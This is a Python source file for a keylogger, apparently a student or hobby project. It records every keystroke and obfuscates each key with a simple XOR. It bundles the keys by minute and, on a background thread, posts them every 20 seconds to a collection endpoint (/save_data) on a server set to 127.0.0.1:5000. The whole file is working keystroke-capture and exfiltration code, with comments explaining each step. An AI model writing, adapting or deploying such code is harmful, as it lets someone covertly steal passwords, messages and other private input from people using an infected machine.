import keyboard, requests, threading, time                       #Import a library that records keyboard keystrokes.
from datetime import datetime            #Import a library that records date and time.
from Xor_2 import xor_on_key

my_json = []
url = f"http://127.0.0.1:5000/save_data"
times = []

def send_data_to_server():
    status = requests.post(url, json=my_json)
    return status

def time_stoper(timeout, func):
    def wrapper():
        global my_json, times
        while True:
            time.sleep(timeout)
            func()
            my_json = []
            times = []
    t = threading.Thread(target=wrapper, daemon=True)
    t.start()

def replace_char(char):
    if char == "backspace" or char == "space":
        char = " "
    if char == "enter":
        char = "\n"
    if char == "tab":
        char = "\t"
    if char == "decimal":
        char = "."
    return char

def on_key_press(key):

    """
    A function that receives input from another function (which records the keyboard),
    and inserts it into a dictionary entry whose key is the current date and time.
    """

    key = xor_on_key(replace_char(key.name), 7)

    current_time = datetime.now().strftime('%y/%m/%d %H:%M')
    year = datetime.now().strftime('%y')
    month = datetime.now().strftime('%m')
    day = datetime.now().strftime('%d')
    hour = datetime.now().strftime('%H')
    minute = datetime.now().strftime('%M')

    if current_time not in times:
        times.append(current_time)
        my_json.append({"date": f"{month}/{day}/{year}", "time": f"{hour}:{minute}", "text": key})
    else:
        my_json[-1]["text"] += key


#For checking the current file.
if __name__ == "__main__":
    keyboard.on_press(on_key_press)               #function call.
    print("program start")
    time_stoper(20, send_data_to_server)
    keyboard.wait('Ctrl + Shift + .')           #Calling a function that terminates the program.